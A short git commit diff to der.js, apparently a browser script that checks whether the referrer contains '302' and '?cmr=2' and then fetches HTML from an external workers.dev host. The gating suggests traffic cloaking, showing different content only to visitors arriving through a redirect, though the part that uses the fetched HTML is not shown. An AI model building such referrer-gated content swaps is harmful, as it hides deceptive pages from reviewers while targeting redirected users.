e55825c17745cdf2cb5efa32c20710a93323148b
mrotang <65051182+mrotang@users.noreply.github.com>
2023-05-20 22:05:15 +0700

    Update der.js

--- der.js
+++ der.js
@@ -1,8 +1,5 @@
-// Mendapatkan URL saat ini
-var currentUrl = window.location.href;
-
 // Memeriksa apakah sumber lalu lintas adalah redirect status 302 dan memiliki parameter ?cmr=2
-if (document.referrer && document.referrer.includes("302") && currentUrl.includes("?cmr=2")) {
+if (document.referrer && document.referrer.includes("302") && document.referrer.includes("?cmr=2")) {
   // Mengambil HTML dari https://crm-template-one.mastimon.workers.dev/
   fetch("https://crm-template-one.mastimon.workers.dev/")
     .then(response => response.text())
